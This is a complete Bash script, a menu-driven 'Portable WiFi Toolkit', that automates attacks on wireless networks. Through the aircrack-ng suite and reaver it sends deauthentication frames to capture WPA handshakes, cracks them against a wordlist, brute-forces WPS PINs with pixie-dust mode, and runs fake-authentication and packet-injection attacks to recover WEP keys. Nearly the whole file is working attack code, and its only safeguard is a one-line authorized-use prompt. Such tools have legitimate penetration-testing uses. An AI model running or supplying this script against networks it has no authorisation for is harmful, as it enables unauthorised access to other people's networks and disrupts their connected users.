#!/bin/bash

# Strict mode
set -euo pipefail

# =============================
# GLOBAL VARIABLES (PORTABLE)
# =============================

isKali=0
isKaliTwo=0
linuxVersion=""

# Paths (detected at runtime)
pathAircrack=""
pathAireplay=""
pathAirodump=""
pathBesside=""
pathCut=""
pathDate=""
pathGrep=""
pathHead=""
pathLink=""
pathMacchanger=""
pathMkdir=""
pathPacketforge=""
pathReaver=""
pathRmdir=""
pathSed=""
pathSleep=""
pathTail=""
pathWash=""
pathWget=""

# Statuses
declare -A dep_status

# Date/Time
currentDate=""
currentTime=""
currentDateTime=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Auto-detected interface
interface=""
monitor_interface=""

# Attack vars
channel=""
bssid=""
essid=""

# Attack defaults (no hardcoded paths)
deauth_count=5
wep_ivs_target=10000
wep_attack="chopchop"
wpa2_handshake_timeout=90
wps_pin_timeout=300
wps_pixie_mode=1

session_name=""
session_dir=""

# =============================
# BANNERS
# =============================

banner() {
    echo -e "${GREEN}"
    echo "=========================================="
    echo "      Portable WiFi Toolkit v1.0"
    echo "=========================================="
    echo -e "${NC}"
}

bannerStats() {
    echo -e "${BLUE}System Info:${NC}"
    echo "OS: $(uname -s)"
    echo "Kernel: $(uname -r)"
    if [ "$isKali" -eq 1 ]; then
        echo "Distro: Kali Linux"
    fi
    echo "Interface: ${interface:-not set}"
    echo "------------------------------------------"
}

# =============================
# CORE FUNCTIONS
# =============================

initMain() {
    checkLinuxVersion
    detectInterface
    killAll
    getCurrentDate
    getCurrentTime
    getCurrentDateAndTime

    findDependencies
    checkDependencies

    resizeWindow
    setAttackDefaults

    setDefaultSession
    showDisclaimer
    menuMain
}

checkLinuxVersion() {
    isKali=0
    isKaliTwo=0

    if command -v lsb_release &> /dev/null; then
        linuxVersion=$(lsb_release -a 2>/dev/null | grep "Description" | cut -f2 -d":" | xargs)
    elif [ -f /etc/os-release ]; then
        linuxVersion=$(grep PRETTY_NAME /etc/os-release | cut -d'"' -f2)
    else
        linuxVersion="Unknown"
    fi

    if echo "$linuxVersion" | grep -qi "kali"; then
        isKali=1
        if echo "$linuxVersion" | grep -q "2\."; then
            isKaliTwo=1
        fi
    fi
}

detectInterface() {
    echo -e "${YELLOW}[*] Detecting wireless interface...${NC}"
    for iface in $(ls /sys/class/net/ | grep -E '^wl'); do
        if iwconfig "$iface" &> /dev/null; then
            interface="$iface"
            echo -e "${GREEN}[+] Found: $interface${NC}"
            return 0
        fi
    done
    echo -e "${RED}[!] No wireless interface found. Please specify manually.${NC}"
    read -p "Enter interface name (e.g., wlan0): " interface
}

killAll() {
    echo -e "${YELLOW}[*] Stopping conflicting processes...${NC}"
    for proc in airodump-ng aireplay-ng airbase-ng reaver wash; do
        pkill -f "$proc" 2>/dev/null || true
    done
    echo -e "${GREEN}[+] Done.${NC}"
}

getCurrentDate() { currentDate=$(date +"%Y-%m-%d"); }
getCurrentTime() { currentTime=$(date +"%H:%M:%S"); }
getCurrentDateAndTime() { currentDateTime=$(date +"%Y-%m-%d %H:%M:%S"); }

resizeWindow() {
    printf '\e[8;30;90t' 2>/dev/null || true
}

setAttackDefaults() {
    : # All defaults are already set as variables above
}

setDefaultSession() {
    session_name="portable_session_$(date +%s)"
    session_dir="/tmp/${session_name}"
    mkdir -p "$session_dir"
}

showDisclaimer() {
    clear
    banner
    echo -e "${RED}DISCLAIMER:${NC}"
    echo "This tool is for authorized use ONLY."
    echo "Unauthorized network access is illegal."
    echo ""
    echo -n "Do you accept? (y/N): "
    read -r response
    if [[ ! "$response" =~ ^[Yy]$ ]]; then
        echo "Exiting."
        exit 0
    fi
    echo ""
}

# =============================
# DEPENDENCY HANDLING (PORTABLE)
# =============================

findDependencies() {
    tools=(
        aircrack-ng
        aireplay-ng
        airodump-ng
        besside-ng
        cut
        date
        grep
        head
        link
        macchanger
        mkdir
        packetforge-ng
        reaver
        rmdir
        sed
        sleep
        tail
        wash
        wget
    )

    echo -e "${YELLOW}[*] Locating dependencies...${NC}"
    for tool in "${tools[@]}"; do
        if path=$(command -v "$tool" 2>/dev/null); then
            var_name="path$(echo "$tool" | sed 's/-//g' | sed 's/ng$//')"
            eval "$var_name='$path'"
            dep_status["$tool"]="OK"
            echo -e "${GREEN}[+] $tool: $path${NC}"
        else
            dep_status["$tool"]="MISSING"
            echo -e "${RED}[-] $tool: NOT FOUND${NC}"
        fi
    done
}

checkDependencies() {
    missing=0
    critical=("aircrack-ng" "airodump-ng" "aireplay-ng")
    for tool in "${critical[@]}"; do
        if [ "${dep_status[$tool]}" != "OK" ]; then
            ((missing++))
        fi
    done
    if [ $missing -gt 0 ]; then
        echo -e "${RED}[!] Critical tools missing. Install aircrack-ng suite.${NC}"
        exit 1
    fi
}

# =============================
# ATTACK SUPPORT
# =============================

ensureMonitorMode() {
    local iface="$1"
    if ! iwconfig "$iface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${YELLOW}[*] Enabling monitor mode on $iface...${NC}"
        if [ "$isKali" -eq 1 ] && command -v airmon-ng &> /dev/null; then
            airmon-ng check kill >/dev/null 2>&1 || true
            airmon-ng start "$iface" >/dev/null 2>&1
            monitor_interface="${iface}mon"
        else
            ip link set "$iface" down
            iwconfig "$iface" mode monitor
            ip link set "$iface" up
            monitor_interface="$iface"
        fi
    else
        monitor_interface="$iface"
    fi
}

disableMonitorMode() {
    local iface="$1"
    if [ -n "$iface" ] && echo "$iface" | grep -q "mon$"; then
        base_iface="${iface%mon}"
        ip link set "$iface" down 2>/dev/null || true
        iw dev "$iface" del 2>/dev/null || true
        ip link set "$base_iface" up 2>/dev/null || true
    fi
}

# =============================
# ATTACK FUNCTIONS (PORTABLE)
# =============================

crackWPAHandshake() {
    local cap_file="$session_dir/handshake-01.cap"
    if [ ! -f "$cap_file" ]; then
        echo -e "${RED}[!] Handshake file not found.${NC}"
        return 1
    fi

    echo -e "${BLUE}[*] To crack WPA, you need a wordlist.${NC}"
    read -p "Enter wordlist path (e.g., ./wordlist.txt): " wordlist_file

    if [ ! -f "$wordlist_file" ]; then
        echo -e "${RED}[!] Wordlist not found: $wordlist_file${NC}"
        return 1
    fi

    echo -e "${GREEN}[*] Cracking with: $wordlist_file${NC}"
    num_cores=$(nproc 2>/dev/null || echo 2)

    if "$pathAircrack" -w "$wordlist_file" "$cap_file" -l "$session_dir/password.txt" --workers "$num_cores" 2>/dev/null; then
        if [ -s "$session_dir/password.txt" ]; then
            password=$(cat "$session_dir/password.txt")
            echo -e "\n${GREEN}[+] PASSWORD FOUND: $password${NC}"
            echo "$password" >> "$session_dir/found_passwords.txt"
            return 0
        fi
    fi
    echo -e "${RED}[!] Password not found.${NC}"
    return 1
}

attackWPA() {
    local target_bssid="$1"
    local target_channel="$2"
    local target_essid="$3"

    if [ -z "$target_bssid" ] || [ -z "$target_channel" ]; then
        echo -e "${RED}[!] BSSID and channel required.${NC}"
        return 1
    fi

    ensureMonitorMode "$interface"
    echo -e "${GREEN}[*] Capturing handshake for $target_essid...${NC}"

    "$pathAirodump" -c "$target_channel" --bssid "$target_bssid" \
        -w "$session_dir/handshake" "$monitor_interface" >/dev/null 2>&1 &
    AIRODUMP_PID=$!

    sleep 5
    "$pathAireplay" --deauth "$deauth_count" -a "$target_bssid" "$monitor_interface" >/dev/null 2>&1 &

    echo -e "${BLUE}[*] Waiting for handshake (max ${wpa2_handshake_timeout}s)...${NC}"
    start_time=$(date +%s)
    while true; do
        if [ -f "$session_dir/handshake-01.cap" ]; then
            if "$pathAircrack" -J "$session_dir/check" "$session_dir/handshake-01.cap" 2>&1 | grep -q "1 handshake"; then
                echo -e "${GREEN}[+] Handshake captured!${NC}"
                kill $AIRODUMP_PID 2>/dev/null || true

                echo -n -e "${YELLOW}Crack now? (y/N): ${NC}"
                read -r choice
                if [[ "$choice" =~ ^[Yy]$ ]]; then
                    crackWPAHandshake
                fi
                return 0
            fi
        fi

        if [ $(( $(date +%s) - start_time )) -ge $wpa2_handshake_timeout ]; then
            echo -e "${RED}[!] Timeout.${NC}"
            break
        fi
        sleep 2
    done

    kill $AIRODUMP_PID 2>/dev/null || true
    return 1
}

attackWPS() {
    local target_bssid="$1"
    local target_channel="$2"

    if [ "${dep_status[reaver]}" != "OK" ] || [ "${dep_status[wash]}" != "OK" ]; then
        echo -e "${RED}[!] Reaver or Wash not available.${NC}"
        return 1
    fi

    ensureMonitorMode "$interface"
    echo -e "${GREEN}[*] Checking WPS...${NC}"

    if ! timeout 10 "$pathWash" -i "$monitor_interface" -c "$target_channel" 2>/dev/null | grep -q "$target_bssid"; then
        echo -e "${RED}[!] WPS not active.${NC}"
        return 1
    fi

    echo -e "${BLUE}[*] Launching Reaver...${NC}"
    local reaver_opts="-i $monitor_interface -b $target_bssid -c $target_channel -vv"
    [ "$wps_pixie_mode" -eq 1 ] && reaver_opts="$reaver_opts -K 1"

    "$pathReaver" $reaver_opts -o "$session_dir/reaver.log" -s "$session_dir/reaver.session" &
    REAVER_PID=$!

    if timeout $wps_pin_timeout grep -m1 "WPS PIN:" "$session_dir/reaver.log" >/dev/null 2>&1; then
        echo -e "${GREEN}[+] WPS PIN found!${NC}"
        kill $REAVER_PID 2>/dev/null || true
        return 0
    else
        echo -e "${RED}[!] Reaver failed.${NC}"
        kill $REAVER_PID 2>/dev/null || true
        return 1
    fi
}

attackWEP() {
    local target_bssid="$1"
    local target_channel="$2"

    ensureMonitorMode "$interface"
    echo -e "${GREEN}[*] Starting WEP attack...${NC}"

    "$pathAirodump" -c "$target_channel" --bssid "$target_bssid" \
        -w "$session_dir/wep" "$monitor_interface" >/dev/null 2>&1 &
    AIRODUMP_PID=$!

    sleep 5
    fake_mac="00:11:22:33:44:55"
    "$pathAireplay" -1 2 -a "$target_bssid" -h "$fake_mac" "$monitor_interface" >/dev/null 2>&1 &
    FAKEAUTH_PID=$!

    sleep 5
    if [ "$wep_attack" = "chopchop" ]; then
        "$pathAireplay" -4 -b "$target_bssid" -h "$fake_mac" "$monitor_interface" >/dev/null 2>&1 &
    else
        "$pathAireplay" -5 -b "$target_bssid" -h "$fake_mac" "$monitor_interface" >/dev/null 2>&1 &
    fi

    echo -e "${BLUE}[*] Collecting IVs (target: $wep_ivs_target)...${NC}"
    while true; do
        if [ -f "$session_dir/wep-01.ivs" ]; then
            ivs_count=$("$pathAirodump" "$session_dir/wep-01.ivs" 2>/dev/null | grep -o '[0-9]* IV' | head -1 | cut -d' ' -f1)
            ivs_count=${ivs_count:-0}
            echo -ne "\rIVs: $ivs_count / $wep_ivs_target"
            if [ "$ivs_count" -ge "$wep_ivs_target" ]; then
                echo -e "\n${GREEN}[+] Target IVs reached!${NC}"
                break
            fi
        fi
        sleep 5
    done

    kill $AIRODUMP_PID $FAKEAUTH_PID 2>/dev/null || true
    echo -e "${BLUE}[*] Cracking WEP key...${NC}"
    "$pathAircrack" "$session_dir/wep-01.ivs" -n 64
}

# =============================
# MENU
# =============================

menuMain() {
    while true; do
        clear
        banner
        bannerStats
        echo "=== MAIN MENU ==="
        echo "1) WPA/WPA2 Attack"
        echo "2) WPS Attack"
        echo "3) WEP Attack"
        echo "4) Exit"
        echo -n "Choose: "
        read -r opt

        case $opt in
            1)
                read -p "BSSID: " bssid
                read -p "Channel: " channel
                read -p "ESSID (optional): " essid
                attackWPA "$bssid" "$channel" "$essid"
                read -p "Press ENTER..."
                ;;
            2)
                read -p "BSSID: " bssid
                read -p "Channel: " channel
                attackWPS "$bssid" "$channel"
                read -p "Press ENTER..."
                ;;
            3)
                read -p "BSSID: " bssid
                read -p "Channel: " channel
                attackWEP "$bssid" "$channel"
                read -p "Press ENTER..."
                ;;
            4)
                disableMonitorMode "$monitor_interface"
                echo "Goodbye!"
                exit 0
                ;;
            *)
                echo "Invalid."
                sleep 1
                ;;
        esac
    done
}

# =============================
# ENTRY POINT
# =============================

main() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Run as root: sudo $0${NC}"
        exit 1
    fi
    initMain "$@"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
